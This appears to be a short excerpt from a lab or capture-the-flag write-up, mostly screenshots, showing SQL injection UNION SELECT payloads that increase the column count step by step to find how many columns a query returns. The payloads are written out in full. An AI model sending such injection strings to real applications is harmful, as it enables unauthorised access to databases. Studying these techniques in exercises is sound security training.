...
# Question
---
![](Pasted%20image%2020250131172016.png)
...
![](Pasted%20image%2020250131172255.png)

So, we need to keep adding more:

`xx' union select 1,2-- -`

![](Pasted%20image%2020250131172334.png)

We need more:

`xx' union select 1,2,3-- -`

![](Pasted%20image%2020250131172400.png)

More:

`xx' union select 1,2,3,4-- -`

![](Pasted%20image%2020250131172430.png)
...
![](Pasted%20image%2020250131172528.png)
